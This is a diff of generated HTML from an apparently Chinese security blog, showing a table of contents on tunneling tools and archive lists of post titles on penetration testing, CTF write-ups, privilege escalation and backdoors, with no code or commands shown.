class="toc-number">4.6.3.6.</span> <span class="toc-text">UDP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTTP"><span class="toc-number">4.6.3.7.</span> <span class="toc-text">HTTP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTTPS"><span class="toc-number">4.6.3.8.</span> <span class="toc-text">HTTPS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#STCP"><span class="toc-number">4.6.3.9.</span> <span class="toc-text">STCP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SUDP"><span class="toc-number">4.6.3.10.</span> <span class="toc-text">SUDP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XTCP"><span class="toc-number">4.6.3.11.</span> <span class="toc-text">XTCP</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9A%A7%E9%81%93"><span class="toc-number">5.</span> <span class="toc-text">隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%86%85%E7%BD%91%E8%BF%9E%E9%80%9A%E6%80%A7"><span class="toc-number">5.1.</span> <span class="toc-text">判断内网连通性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ICMP%E9%9A%A7%E9%81%93"><span class="toc-number">5.1.1.</span> <span class="toc-text">ICMP隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pingtunnel"><span class="toc-number">5.1.1.1.</span> <span class="toc-text">pingtunnel</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#icmpsh"><span class="toc-number">5.1.1.2.</span> <span class="toc-text">icmpsh</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1ICMP%E9%9A%A7%E9%81%93"><span class="toc-number">5.1.1.3.</span> <span class="toc-text">防御ICMP隧道</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#udptunnel"><span class="toc-number">5.2.</span> <span class="toc-text">udptunnel</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">6.</span> <span class="toc-text">参考链接</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -3014,103 +4280,9 @@ top:50vh;
     
     
     
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 141
+        Total : 147
         </div>
         <!-- search  -->
         
@@ -3125,8 +4297,32 @@ top:50vh;
     
     
     
+    <div class="archive-year"> 2022 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/24</span><a class="archive-post-title" href= "/2022/01/24/Docker%E9%80%83%E9%80%B8%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/" >Docker逃逸几种方法</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/12</span><a class="archive-post-title" href= "/2022/01/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BLinux%E5%8F%8AWindows%E9%9A%90%E8%97%8F%E7%AF%87/" >内网渗透之Linux及Windows隐藏篇</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
     <div class="archive-year"> 2021 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/29</span><a class="archive-post-title" href= "/2021/12/29/badusb%E5%88%B6%E4%BD%9C%E4%B8%8A%E7%BA%BFcs/" >badusb制作上线cs</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -3175,16 +4371,6 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/17</span><a class="archive-post-title" href= "/2021/11/17/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%85%A5%E9%97%A8-1-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%92%8C%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%80%E4%BB%8B/" >神经网络入门(1):神经网络和机器学习简介</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">11/15</span><a class="archive-post-title" href= "/2021/11/15/%E6%9E%81%E8%87%B4cms-v1-9-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" >极致cms v1.9.5文件上传漏洞</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">11/10</span><a class="archive-post-title" href= "/2021/11/10/javaweb%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-SSRF/" >javaweb代码审计学习(SSRF)</a>
         </li>
     
@@ -3205,27 +4391,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/05</span><a class="archive-post-title" href= "/2021/11/05/%E5%BC%BA%E7%BD%91%E6%9D%AF%E6%8B%9F%E6%80%81easy-filter%E8%A7%A3%E6%9E%90/" >强网杯拟态easy filter解析</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">11/05</span><a class="archive-post-title" href= "/2021/11/05/vscode%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95php%E5%BA%95%E5%B1%82%E4%BB%A3%E7%A0%81/" >vscode远程调试php底层代码</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/02</span><a class="archive-post-title" href= "/2021/11/02/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E6%80%BB%E7%BB%93/" >文件包含漏洞小总结</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">11/01</span><a class="archive-post-title" href= "/2021/11/01/javaweb%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-sql%E6%B3%A8%E5%85%A5/" >javaweb代码审计学习(sql注入)</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">10/26</span><a class="archive-post-title" href= "/2021/10/26/%E6%97%A0%E5%8F%82%E6%95%B0rce%E6%96%B0%E8%A7%A3%E6%B3%95-2021%E6%85%95%E6%B5%8Bweb%E5%BA%94%E7%94%A8%E4%B8%AA%E4%BA%BA%E8%B5%9Bnorce/" >无参数rce新解法(2021慕测web应用个人赛norce)</a>
         </li>
     
     
@@ -3270,17 +4441,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">09/17</span><a class="archive-post-title" href= "/2021/09/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%E7%AF%87%E4%B8%89-Windows%E6%8F%90%E6%9D%83/" >渗透测试之提权篇三(Windows提权)</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">09/15</span><a class="archive-post-title" href= "/2021/09/15/laravel%20RCE%E6%BC%8F%E6%B4%9E-CVE-2021-3129-%E5%88%A9%E7%94%A8/" >laravel RCE漏洞(CVE-2021-3129)利用</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/06</span><a class="archive-post-title" href= "/2021/09/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%E7%AF%87%E4%BA%8C-Linux%E6%8F%90%E6%9D%83/" >渗透测试之提权篇二(Linux提权)</a>
         </li>
     
     
@@ -3360,7 +4521,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/28</span><a class="archive-post-title" href= "/2021/06/28/kerberos%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/" >kerberos协议学习及攻击方法总结</a>
+            <span class="archive-post-date">06/28</span><a class="archive-post-title" href= "/2021/06/28/kerberos%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/" >内网渗透之kerberos协议学习及攻击方法总结</a>
         </li>
     
     
@@ -3385,11 +4546,6 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/18</span><a class="archive-post-title" href= "/2021/06/18/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%BD%92%E7%BA%B3/" >未授权访问漏洞归纳</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">06/18</span><a class="archive-post-title" href= "/2021/06/18/arp%E6%AC%BA%E9%AA%97%E4%B8%8E%E6%94%BB%E5%87%BB/" >arp欺骗与攻击</a>
         </li>
     
@@ -3405,11 +4561,6 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/24</span><a class="archive-post-title" href= "/2021/04/24/%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E5%B0%8F%E7%AC%94%E8%AE%B0/" >弱类型比较小笔记</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">04/23</span><a class="archive-post-title" href= "/2021/04/23/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%B0%8F%E6%80%BB%E7%BB%93/" >代码执行小总结</a>
         </li>
     
@@ -3421,21 +4572,6 @@ top:50vh;
     
         <li class="archive-post-item">
             <span class="archive-post-date">04/19</span><a class="archive-post-title" href= "/2021/04/19/redis%E6%94%BB%E9%98%B2%E5%88%A9%E7%94%A8%E9%9D%A2%E6%80%BB%E7%BB%93/" >redis攻防利用面总结</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/17</span><a class="archive-post-title" href= "/2021/04/17/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%B8%B8%E8%A7%81%E8%AF%BB%E5%8F%96%E8%B7%AF%E5%BE%84-NU1L%E7%9A%84%E4%B9%A6/" >文件读取漏洞常见读取路径(NU1L的书)</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/13</span><a class="archive-post-title" href= "/2021/04/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96getshell-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-Upload/" >文件上传反序列化getshell-[强网杯 2019]Upload</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/09</span><a class="archive-post-title" href= "/2021/04/09/%E8%AF%BB%E5%8F%96%E5%8F%98%E9%87%8Fgetflag-BJDCTF2020-EzPHP/" >读取变量getflag-[BJDCTF2020]EzPHP</a>
         </li>
     
     
@@ -3499,11 +4635,6 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/19</span><a class="archive-post-title" href= "/2020/12/19/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E6%9E%84%E9%80%A0shell%E5%B0%8F%E6%80%BB%E7%BB%93/" >无字母数字构造shell小总结</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">12/12</span><a class="archive-post-title" href= "/2020/12/12/%E5%88%A9%E7%94%A8phar%E6%8B%93%E5%B1%95%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E9%9D%A2%E4%BE%8B%E9%A2%98/" >利用phar拓展反序列化攻击面例题</a>
         </li>
     
@@ -3519,11 +4650,6 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/16</span><a class="archive-post-title" href= "/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/" >浅析SSRF漏洞</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">11/14</span><a class="archive-post-title" href= "/2020/11/14/balckhat%E8%AE%AE%E9%A2%98%E7%9A%84%E5%BA%94%E7%94%A8-python-nignx-pythonignx/" >balckhat议题的应用(python+nignx=pythonignx)</a>
         </li>
     
@@ -3535,16 +4661,6 @@ top:50vh;
     
         <li class="archive-post-item">
             <span class="archive-post-date">11/09</span><a class="archive-post-title" href= "/2020/11/09/redis%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%E7%AC%94%E8%AE%B0/" >redis的基本操作笔记</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">11/09</span><a class="archive-post-title" href= "/2020/11/09/%E5%BC%80%E6%BA%90Web%E5%BA%94%E7%94%A8%E6%89%AB%E6%8F%8F%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/" >开源Web应用扫描软件使用笔记</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">11/08</span><a class="archive-post-title" href= "/2020/11/08/%E6%97%A0%E5%8F%82%E6%95%B0%E6%9E%84%E9%80%A0payload%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6-%E5%90%ABPHP%E6%95%B0%E7%BB%84%E7%9A%84%E7%9F%A5%E8%AF%86/" >无参数构造payload读取文件(含PHP数组的知识)</a>
         </li>
     
     
@@ -3579,16 +4695,6 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/23</span><a class="archive-post-title" href= "/2020/10/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%E7%AF%87/" >渗透测试之提权篇一(Linux用户组及内核)</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">10/20</span><a class="archive-post-title" href= "/2020/10/20/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%9A-SUCTF-2019-EasySQL/" >刷题记录：[SUCTF 2019]EasySQL</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">10/20</span><a class="archive-post-title" href= "/2020/10/20/N1CTF-websignin-sql%E6%B3%A8%E5%85%A5-%E9%80%BB%E8%BE%91/" >N1CTF_websignin(sql注入&逻辑)</a>
         </li>
     
@@ -3599,17 +4705,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/14</span><a class="archive-post-title" href= "/2020/10/14/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/" >变量覆盖漏洞</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">10/13</span><a class="archive-post-title" href= "/2020/10/13/SQL%E8%AF%AD%E5%8F%A5%E4%B9%8B%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" >SQL语句之增删改查及用户权限</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">10/13</span><a class="archive-post-title" href= "/2020/10/13/%E9%9B%B6%E5%AE%BD%E5%BA%A6%E5%AD%97%E7%AC%A6%E9%9A%90%E5%86%99/" >零宽度字符隐写</a>
         </li>
     
     
@@ -3644,42 +4740,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">09/10</span><a class="archive-post-title" href= "/2020/09/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Reverse-it-xxd%E3%80%81tr%E3%80%81rev%E5%91%BD%E4%BB%A4/" >攻防世界-Reverse-it(xxd、tr、rev命令)</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/06</span><a class="archive-post-title" href= "/2020/09/06/%E7%A0%B4%E8%A7%A3zip%E5%AF%86%E7%A0%81%E5%91%BD%E4%BB%A4/" >破解zip密码命令</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/26</span><a class="archive-post-title" href= "/2020/08/26/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-stegnao-%E4%BA%8C%E7%BB%B4%E7%A0%81%E5%8E%9F%E7%90%86/" >攻防世界-stegnao-二维码原理及rar伪加密</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">08/21</span><a class="archive-post-title" href= "/2020/08/21/2020%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86writeup/" >2020全国大学生信息安全大赛-初赛部分writeup</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/19</span><a class="archive-post-title" href= "/2020/08/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-CAT-PHP-curl/" >宽字节注入+curl读取文件+Django框架漏洞的组合拳</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">08/19</span><a class="archive-post-title" href= "/2020/08/19/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" >SSTI模板注入</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/19</span><a class="archive-post-title" href= "/2020/08/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web_php_unserialize/" >__wakeup()的绕过和正则绕过</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/19</span><a class="archive-post-title" href= "/2020/08/19/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Web-Unfinish/" >二次注入在实战的运用</a>
         </li>
     
     
@@ -3690,16 +4756,6 @@ top:50vh;
     
         <li class="archive-post-item">
             <span class="archive-post-date">08/16</span><a class="archive-post-title" href= "/2020/08/16/Jarvis-flag%E5%9C%A8%E7%AE%A1%E7%90%86%E5%91%98%E6%89%8B%E9%87%8C/" >Hash长度拓展攻击</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/15</span><a class="archive-post-title" href= "/2020/08/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%8F%8D%E5%BC%B9shell%E5%92%8C%E7%95%99%E5%90%8E%E9%97%A8/" >渗透测试之反弹shell和留后门</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/15</span><a class="archive-post-title" href= "/2020/08/15/%E8%BD%AC%E8%BD%BD-CSP%E6%80%BB%E7%BB%93%E5%8F%8ACTF%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/" >[转载]CSP总结及CTF实例分析</a>
         </li>
     
     
@@ -3734,22 +4790,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/12</span><a class="archive-post-title" href= "/2020/08/12/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Web-hate-php/" >取反异或绕过</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/11</span><a class="archive-post-title" href= "/2020/08/11/%E8%BD%AC%E8%BD%BD-sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A4%A7%E9%9B%86%E5%90%88/" >[转载]sql注入绕过大集合</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">08/08</span><a class="archive-post-title" href= "/2020/08/08/JWT%E7%9A%84%E5%88%A9%E7%94%A8/" >JWT的利用</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/07</span><a class="archive-post-title" href= "/2020/08/07/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86%EF%BC%88%E6%9B%B4%E6%96%B0-%EF%BC%89/" >命令执行小总结</a>
         </li>
     
     
@@ -3779,17 +4820,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">07/29</span><a class="archive-post-title" href= "/2020/07/29/%E6%90%AD%E5%BB%BAwordpress%E7%8E%AF%E5%A2%83-docker-%E6%B5%8B%E8%AF%95plugin%E6%BC%8F%E6%B4%9E/" >搭建wordpress环境(docker)测试plugin漏洞</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">07/23</span><a class="archive-post-title" href= "/2020/07/23/metasploit%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%AD%A6%E4%B9%A0/" >metasploit之信息收集学习</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">07/22</span><a class="archive-post-title" href= "/2020/07/22/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E5%B8%B8%E7%94%A8Windows%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8/" >[转载]渗透基础-常用Windows命令大全</a>
         </li>
     
     
@@ -3809,11 +4840,6 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/11</span><a class="archive-post-title" href= "/2020/06/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/" >文件上传漏洞知识点整理</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">06/10</span><a class="archive-post-title" href= "/2020/06/10/MD5-collision/" >MD5-collision</a>
         </li>
     
@@ -3829,12 +4855,233 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/16</span><a class="archive-post-title" href= "/2020/04/16/%E5%88%A9%E7%94%A8ms17-010%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB/" >利用ms17-010漏洞进行攻击</a>
+            <span class="archive-post-date">04/12</span><a class="archive-post-title" href= "/2020/04/12/MySQL%E7%9A%84%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C%EF%BC%881%EF%BC%89/" >MySQL的基础操作（1）</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/10/08/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BLinux%E5%8F%8AWindows%E5%90%8E%E9%97%A8%E7%AF%87/" >[Untitled Post]</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2022 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/13</span><a class="archive-post-title" href= "/2022/01/13/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%8F%8D%E5%BC%B9shell%E5%90%88%E9%9B%86/" >渗透测试之反弹shell合集</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/12</span><a class="archive-post-title" href= "/2020/04/12/MySQL%E7%9A%84%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C%EF%BC%881%EF%BC%89/" >MySQL的基础操作（1）</a>
+            <span class="archive-post-date">01/10</span><a class="archive-post-title" href= "/2022/01/10/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8Balisa%E5%90%8E%E9%97%A8/" >权限维持之alisa后门</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/10</span><a class="archive-post-title" href= "/2022/01/10/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8BLD-PRELOAD%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E5%90%8E%E9%97%A8/" >权限维持之LD_PRELOAD动态链接库后门</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2021 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/17</span><a class="archive-post-title" href= "/2021/11/17/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%85%A5%E9%97%A8-1-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%92%8C%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%80%E4%BB%8B/" >神经网络入门(1):神经网络和机器学习简介</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/15</span><a class="archive-post-title" href= "/2021/11/15/%E6%9E%81%E8%87%B4cms-v1-9-5%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" >极致cms v1.9.5文件上传漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/05</span><a class="archive-post-title" href= "/2021/11/05/%E5%BC%BA%E7%BD%91%E6%9D%AF%E6%8B%9F%E6%80%81easy-filter%E8%A7%A3%E6%9E%90/" >强网杯拟态easy filter解析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href= "/2021/11/02/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E6%80%BB%E7%BB%93/" >文件包含漏洞小总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/26</span><a class="archive-post-title" href= "/2021/10/26/%E6%97%A0%E5%8F%82%E6%95%B0rce%E6%96%B0%E8%A7%A3%E6%B3%95-2021%E6%85%95%E6%B5%8Bweb%E5%BA%94%E7%94%A8%E4%B8%AA%E4%BA%BA%E8%B5%9Bnorce/" >无参数rce新解法(2021慕测web应用个人赛norce)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/17</span><a class="archive-post-title" href= "/2021/09/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%E7%AF%87%E4%B8%89-Windows%E6%8F%90%E6%9D%83/" >渗透测试之提权篇三(Windows提权)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/06</span><a class="archive-post-title" href= "/2021/09/06/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%E7%AF%87%E4%BA%8C-Linux%E6%8F%90%E6%9D%83/" >渗透测试之提权篇二(Linux提权)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/18</span><a class="archive-post-title" href= "/2021/06/18/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%BD%92%E7%BA%B3/" >未授权访问漏洞归纳</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/24</span><a class="archive-post-title" href= "/2021/04/24/%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E5%B0%8F%E7%AC%94%E8%AE%B0/" >弱类型比较小笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/17</span><a class="archive-post-title" href= "/2021/04/17/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%B8%B8%E8%A7%81%E8%AF%BB%E5%8F%96%E8%B7%AF%E5%BE%84-NU1L%E7%9A%84%E4%B9%A6/" >文件读取漏洞常见读取路径(NU1L的书)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/13</span><a class="archive-post-title" href= "/2021/04/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96getshell-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-Upload/" >文件上传反序列化getshell-[强网杯 2019]Upload</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/09</span><a class="archive-post-title" href= "/2021/04/09/%E8%AF%BB%E5%8F%96%E5%8F%98%E9%87%8Fgetflag-BJDCTF2020-EzPHP/" >读取变量getflag-[BJDCTF2020]EzPHP</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/19</span><a class="archive-post-title" href= "/2020/12/19/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E6%9E%84%E9%80%A0shell%E5%B0%8F%E6%80%BB%E7%BB%93/" >无字母数字构造shell小总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/16</span><a class="archive-post-title" href= "/2020/11/16/%E6%B5%85%E6%9E%90SSRF%E6%BC%8F%E6%B4%9E/" >浅析SSRF漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
